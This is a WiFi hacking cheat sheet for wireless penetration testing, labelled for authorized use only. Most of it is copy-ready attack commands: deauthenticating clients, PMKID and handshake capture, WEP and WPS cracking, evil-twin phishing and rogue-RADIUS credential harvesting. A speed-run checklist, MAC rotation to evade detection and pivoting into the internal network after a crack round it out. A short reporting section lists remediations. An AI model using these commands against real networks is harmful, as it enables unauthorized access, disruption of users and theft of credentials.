# 📡 WIFI HACKING / WIRELESS PENTESTING CHEAT SHEET

*Field reference for wireless security assessments (authorized testing only)*

---

## 1. 🧭 End-to-End Workflow
```
Recon (Scan) → Target Selection → Capture (Handshake/PMKID) → Deauth (if needed) → Offline Crack → WPS Check → Rogue AP/Evil Twin → Reporting
```

## 2. 🔍 Setup & Recon Phase

**Enable monitor mode:**
```bash
airmon-ng check kill              # kill interfering processes (NetworkManager, wpa_supplicant)
airmon-ng start wlan0             # creates wlan0mon
iwconfig                          # verify monitor mode
```

**Scan for networks:**
```bash
airodump-ng wlan0mon
airodump-ng --band abg wlan0mon   # scan 2.4GHz + 5GHz
```
**Look for:** BSSID, channel, encryption (WEP/WPA/WPA2/WPA3), ESSID, signal strength, connected clients (STATION list), WPS-enabled APs.

**Targeted capture:**
```bash
airodump-ng -c CHANNEL --bssid TARGET_BSSID -w capture wlan0mon
```

---

## 3. 💥 Attack Phase

### WPA/WPA2 — Handshake Capture
```bash
# Deauth a connected client to force re-handshake
aireplay-ng --deauth 5 -a TARGET_BSSID -c CLIENT_MAC wlan0mon

# Verify handshake captured (top right of airodump-ng output: "WPA handshake:")
```

### PMKID Attack (no client needed, no deauth)
```bash
hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1
hcxpcapngtool -o hash.hc22000 capture.pcapng
hashcat -m 22000 hash.hc22000 rockyou.txt
```

### WEP (legacy, fast crack)
```bash
aireplay-ng -1 0 -a TARGET_BSSID wlan0mon          # fake auth
aireplay-ng -3 -b TARGET_BSSID wlan0mon            # ARP replay to generate traffic
aircrack-ng capture-01.cap                          # crack once enough IVs captured
```

### WPS Attack
```bash
wash -i wlan0mon                    # scan for WPS-enabled APs
reaver -i wlan0mon -b TARGET_BSSID -vv              # PIN brute force
bully -b TARGET_BSSID -i wlan0mon                   # alternative WPS tool
```

### Evil Twin / Rogue AP
```bash
airbase-ng -e "TargetSSID" -c CHANNEL wlan0mon
# combine with dnsmasq (DHCP/DNS) + captive portal for credential harvesting
# tool: wifiphisher (automated evil twin + phishing page)
wifiphisher -aI wlan0mon -e "TargetSSID"
```

---

## 4. ⬆️ Post-Capture / Offline Cracking

```bash
# Convert cap to hashcat format
cap2hccapx capture-01.cap capture.hccapx
hashcat -m 2500 capture.hccapx rockyou.txt          # WPA/WPA2 (old format)
hashcat -m 22000 hash.hc22000 rockyou.txt           # WPA/WPA2/WPA3 (new unified format)

# aircrack-ng alternative
aircrack-ng -w rockyou.txt capture-01.cap

# Custom wordlist generation
crunch 8 8 -t %%%%%%%% -o custom.txt              # if pattern known
cewl https://targetcompany.com -w company_words.txt  # company-specific wordlist
```

**Escalation after crack:** obtained PSK → connect to network → treat as internal network pentest (see AD/network domain workflow: enumerate hosts, check for lateral movement, weak internal segmentation).

---

## 5. 🧠 Decision Tree
```
WEP encryption detected        → fast crack via IV capture (aircrack-ng), near-instant
WPS enabled                    → try Reaver/Bully PIN attack first (fast path, no crack needed)
WPA2 + clients connected       → deauth client → capture handshake → offline crack
WPA2 + no clients connected    → PMKID attack (hcxdumptool), no deauth required
WPA3 (SAE) detected            → PMKID attack ineffective; look for downgrade to WPA2 transition mode, or dragonblood-class attacks
Hidden SSID                    → deauth client to force probe request reveal, or brute-force via wordlist
Enterprise (WPA2-EAP/802.1x)   → target via rogue RADIUS (hostapd-wpe) to capture credentials, not PSK
Captive portal / open network  → check for MAC filtering bypass, evil twin phishing opportunity
```

---

## 6. 🛠️ Toolkit
| Tool | Purpose | Fast Command | When to Use |
|---|---|---|---|
| **airmon-ng / airodump-ng / aireplay-ng / aircrack-ng** (aircrack-ng suite) | Full WEP/WPA workflow | scan → capture → deauth → crack | Core toolkit for any WiFi engagement |
| **hcxdumptool / hcxpcapngtool** | PMKID capture & conversion | `hcxdumptool -i wlan0mon -o cap.pcapng` | Clientless WPA2 attack |
| **hashcat** | GPU-accelerated cracking | `hashcat -m 22000 hash.hc22000 wordlist` | Offline handshake/PMKID cracking |
| **reaver / bully** | WPS PIN brute force | `reaver -i wlan0mon -b BSSID -vv` | WPS-enabled targets |
| **wifiphisher** | Automated evil twin + phishing | `wifiphisher -aI wlan0mon` | Social engineering / credential harvest |
| **Wireshark** | Traffic/handshake analysis | filter `eapol` | Verify handshake capture, deep packet inspection |
| **Kismet** | Passive wireless IDS/recon | `kismet -c wlan0mon` | Stealthy long-term recon, rogue AP detection |
| **hostapd-wpe** | Rogue RADIUS for WPA-Enterprise | configure + start hostapd | Enterprise 802.1x credential capture |

---

## 7. 🚨 Common Misconfigurations / Weak Points
- WPS enabled (vulnerable to PIN brute force regardless of PSK strength)
- Weak/default PSK (dictionary-crackable)
- WPA2-Personal used in enterprise environment (shared key = no accountability, easy offline crack)
- No client isolation (lateral movement once on network)
- Legacy WEP still in use
- Enterprise EAP without proper certificate validation (client accepts rogue RADIUS)
- Guest network not segmented from internal network

---

## 8. ⚡ Speed Hacks
- Always try **PMKID attack first** — no deauth, no client needed, near-silent
- Run `wash` scan in parallel with `airodump-ng` to catch WPS targets immediately
- Pre-build company-specific wordlists with `cewl` + common leaked-password lists
- Use GPU rig / cloud GPU instance for hashcat on large handshake batches
- Capture on all channels first (`--band abg`) then target the highest-value BSSID
- Keep a rotating MAC address (`macchanger`) to avoid detection during recon

---

## 9. 📊 Reporting
- **Document:** SSID/BSSID, encryption type, attack method used, time to compromise, cracked PSK (redact in report, note strength), whether WPS was a factor
- **Severity mapping:**
  - **Critical:** WEP in use / PSK cracked in <1hr / Enterprise creds captured via rogue RADIUS
  - **High:** WPS PIN brute-forced successfully / weak PSK cracked with common wordlist
  - **Medium:** Handshake captured but PSK resists standard wordlists (strong password)
  - **Low:** No client isolation / guest network segmentation issue (no direct compromise)
- Recommend: disable WPS, enforce WPA3 or WPA2 with strong PSK/802.1x, client isolation, guest network segmentation, periodic PSK rotation

---

## ⚡ SPEED-RUN CHECKLIST (first 5 minutes on site)
1. `airmon-ng check kill && airmon-ng start wlan0`
2. `airodump-ng wlan0mon` → identify target BSSID/channel
3. `wash -i wlan0mon` → check for WPS in parallel
4. No clients? → `hcxdumptool` PMKID attack
5. Clients present? → targeted `airodump-ng` + `aireplay-ng --deauth`
6. Handshake/PMKID captured → hashcat/aircrack-ng offline crack
7. PSK cracked → connect, pivot to internal network assessment

---
*For authorized penetration testing and security research only. Unauthorized access to wireless networks you do not own or have written permission to test is illegal in most jurisdictions.*
